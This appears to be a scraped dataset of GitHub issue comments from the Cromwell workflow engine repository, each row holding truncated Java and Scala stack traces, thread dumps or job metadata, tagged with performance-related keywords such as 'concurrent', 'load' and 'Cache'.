scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-syst",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:5999,concurren,concurrent,5999,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['concurren'],['concurrent']
Performance,"endJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:1:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:6:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:9503,concurren,concurrent,9503,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"endJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:6:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:1:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:8310,concurren,concurrent,8310,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,engine$backend$jes$JesBackend$$outputLookup(JesBackend.scala:695) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$getOutputFoldingFunction$1.apply(JesBackend.scala:675) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$getOutputFoldingFunction$1.apply(JesBackend.scala:674) ~[cromwell.jar:0.19]; at scala.collection.LinearSeqOptimized$class.foldLeft(LinearSeqOptimized.scala:124) ~[cromwell.jar:0.19]; at scala.collection.immutable.List.foldLeft(List.scala:84) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend.postProcess(JesBackend.scala:665) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:705) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:705) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:700) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketIm,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:5888,concurren,concurrent,5888,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['concurren'],['concurrent']
Performance,equest timed out after 5004ms.; 	at com.zaxxer.hikari.pool.HikariPool.createTimeoutException(HikariPool.java:548); 	at com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.java:186); 	at com.zaxxer.hikari.pool.HikariPool.getConnection(HikariPool.java:145); 	at com.zaxxer.hikari.HikariDataSource.getConnection(HikariDataSource.java:83); 	at slick.jdbc.hikaricp.HikariCPJdbcDataSource.createConnection(HikariCPJdbcDataSource.scala:18); 	at slick.jdbc.JdbcBackend$BaseSession.<init>(JdbcBackend.scala:439); 	at slick.jdbc.JdbcBackend$DatabaseDef.createSession(JdbcBackend.scala:47); 	at slick.jdbc.JdbcBackend$DatabaseDef.createSession(JdbcBackend.scala:38); 	at slick.basic.BasicBackend$DatabaseDef.acquireSession(BasicBackend.scala:218); 	at slick.basic.BasicBackend$DatabaseDef.acquireSession$(BasicBackend.scala:217); 	at slick.jdbc.JdbcBackend$DatabaseDef.acquireSession(JdbcBackend.scala:38); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:239); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); 	at java.lang.Thread.run(Thread.java:745); Caused by: com.mysql.jdbc.exceptions.jdbc4.CommunicationsException: Communications link failure. The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.; 	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); 	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); 	at java.lang.reflect.Constructor.newInstance(Constructor.java:422); 	at com.mysql.jdbc.Util.handleNewInstance(Util.java:425); 	at com.mysql.jdbc.SQLError.createCommunicationsException(SQLError.java:989); 	at com.mysql.jdbc.MysqlIO.<init>(MysqlIO.java:341); 	at com.mysql.jdbc.ConnectionImpl.coreConne,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453:3620,concurren,concurrent,3620,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453,1,['concurren'],['concurrent']
Performance,"er(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:1:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:6:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invok",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:9345,concurren,concurrent,9345,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"er(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:6:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:1:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(Act",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:8152,concurren,concurrent,8152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,er.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$workflowInitializationFailed(MaterializeWorkflowDescriptorActor.scala:200); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$2.applyOrElse(MaterializeWorkflowDescriptorAc,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:100654,concurren,concurrent,100654,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,"erThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:10:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:6:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:7032,concurren,concurrent,7032,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"es (in the latest log it appears 9 times). The output in question is a glob and there are 80 calls to the task producing it. 2 fastqs get chucked into 20 chunks each, so 40 total. FastQC is run for these chunks once before adapter clipping and once after, so 80 total. There's a bunch of other jobs being run as well, but I'm only seeing this error for this specifc output (`Fastqc.images`). ```; [2018-10-11 13:48:43,66] [error] WorkflowManagerActor Workflow 0a20b0d2-8ad2-43b1-ba92-49e1c39d6578 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'Fastqc.images': Futures timed out after [60 seconds]; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:858); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979);",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379:1172,concurren,concurrent,1172,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379,1,['concurren'],['concurrent']
Performance,"escriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Failed to run cwltool on file https://raw.githubusercontent.com/bcbio/test_bcbio_cwl/master/prealign/prealign-workflow/steps/postprocess_alignment_to_rec.cwl (reason 1 of 1): Traceback (most recent call last):; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/heterodon/__init__.py"", line 24, in apply; File ""<string>"", line 1, in <module>; File ""<string>"", line 11, in cwltool_salad; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/cwltool/load_tool.py"", line 113, in fetch_document; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/schema_salad/ref_resolver.py"", line 933, in fetch; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/schema_salad/ref_resolver.py"", line 933, in fetch; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/ruamel/yaml/main.py"", line 948, in round_trip_load; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/ruamel/yaml/main.py"", line 899, in load; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/ruamel/yaml/constructor.py"", line 104, in get_single_data; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/ruamel/yaml/composer.py"", line 79, in get_single_node; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/ruamel/yaml/composer.py"", line 102, in compose_document; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/ruamel/yaml/composer.py"", line 139, in compose_node; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/ruamel/yaml/composer.py"", line 218, in compose_mapping_node; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/ruamel/yaml/composer.py"", line 137, in compose_node; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/ruamel/yaml/composer.py"", line 180, in compose_sequence_node; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/ruamel/yaml/composer.py"", line 139, in compose_node; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/ruamel/yaml/composer.py"", line 211, in compose_mapping_node; File ""/app/cromwell-37-416c665-SNAP.jar/Lib/ruamel/yaml/parser.py"", line 141, in check_event; Fi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4235#issuecomment-445825939:2283,load,load,2283,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4235#issuecomment-445825939,1,['load'],['load']
Performance,"esultReuse"": true; },; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""inputs"": {; ""coverage_file"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/70a6e380-1dd7-473b-a852-4bd54b22ecdf/call-NormalWholeGenomeCoverage/shard-6/execution/SM-74NEG.coverage.tsv"",; ""enable_gc_correction"": true,; ""entity_id"": ""SM-74NEG"",; ""mem"": 4,; ""gatk_jar"": ""/root/gatk-protected.jar"",; ""annotated_targets"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/70a6e380-1dd7-473b-a852-4bd54b22ecdf/call-NormalAnnotateTargets/shard-6/execution/SM-74NEG.annotated.tsv""; },; ""returnCode"": 0,; ""jobId"": ""12340"",; ""backend"": ""Local"",; ""end"": ""2016-09-26T19:52:35.224Z"",; ""stderr"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/70a6e380-1dd7-473b-a852-4bd54b22ecdf/call-NormalCorrectGCBias/shard-6/execution/stderr"",; ""callRoot"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/70a6e380-1dd7-473b-a852-4bd54b22ecdf/call-NormalCorrectGCBias/shard-6"",; ""attempt"": 1,; ""executionEvents"": [{; ""startTime"": ""2016-09-26T19:49:19.556Z"",; ""description"": ""Pending"",; ""endTime"": ""2016-09-26T19:49:19.556Z""; }, {; ""startTime"": ""2016-09-26T19:49:19.556Z"",; ""description"": ""RequestingExecutionToken"",; ""endTime"": ""2016-09-26T19:49:19.557Z""; }, {; ""startTime"": ""2016-09-26T19:49:19.557Z"",; ""description"": ""PreparingJob"",; ""endTime"": ""2016-09-26T19:49:19.559Z""; }, {; ""startTime"": ""2016-09-26T19:49:19.559Z"",; ""description"": ""CheckingCallCache"",; ""endTime"": ""2016-09-26T19:49:19.564Z""; }, {; ""startTime"": ""2016-09-26T19:49:19.564Z"",; ""description"": ""RunningJob"",; ""endTime"": ""2016-09-26T19:49:31.957Z""; }, {; ""startTime"": ""2016-09-26T19:49:31.957Z"",; ""description"": ""UpdatingCallCache"",; ""endTime"": ""2016-09-26T19:49:31.966Z""; }, {; ""startTime"": ""2016-09-26T19:49:31.966Z"",; ""description"": ""UpdatingJobStore"",; ""endTime"": ""2016-09-26T19:49:31.971Z""; }],; ""start"": ""2016-09-26T19:49:19.556Z""; }; ```. Side note, this affected Cache Hit and Cache Miss",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-249866905:2707,Cache,Cache,2707,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-249866905,2,['Cache'],['Cache']
Performance,"euedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at 